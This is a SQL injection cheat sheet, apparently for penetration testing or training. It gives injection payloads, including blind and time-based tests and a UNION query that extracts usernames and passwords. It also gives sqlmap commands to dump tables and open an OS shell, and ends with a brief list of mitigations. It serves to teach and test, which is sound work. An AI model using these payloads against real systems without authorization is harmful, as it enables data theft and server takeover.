# SQL Injection

Inject SQL queries through user input to interact with the backend database.

## Testing for SQLi

### Basic Tests

Try these in input fields, URL parameters, and headers:

```
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' ORDER BY 1--
1' UNION SELECT NULL--
```

If the application behaves differently (error message, different content, bypass), it may be injectable.

### Error-Based Detection

Look for database error messages in responses:
- MySQL: `You have an error in your SQL syntax`
- MSSQL: `Unclosed quotation mark`
- PostgreSQL: `ERROR: syntax error`

## Types of SQLi

### In-Band (Classic)

Results appear directly in the response.

**UNION-Based:**

```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    -- repeat until error

-- Extract data
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
```

**Error-Based:**

Force the database to return data in error messages.

### Blind SQLi

No visible output -- infer results from behavior.

**Boolean-Based:**

```sql
-- True condition (normal page)
' AND 1=1--

-- False condition (different page)
' AND 1=2--

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a'--
```

**Time-Based:**

```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

If the response is delayed, the injection works.

## Automated with sqlmap

```bash
# Basic test
sqlmap -u "http://target.com/page?id=1"

# With POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Using a saved Burp request
sqlmap -r request.txt

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Get a shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

## Mitigations

- Parameterized queries / prepared statements (primary defense)
- Input validation and sanitization
- Least privilege database accounts
- WAF rules (defense in depth, not primary)
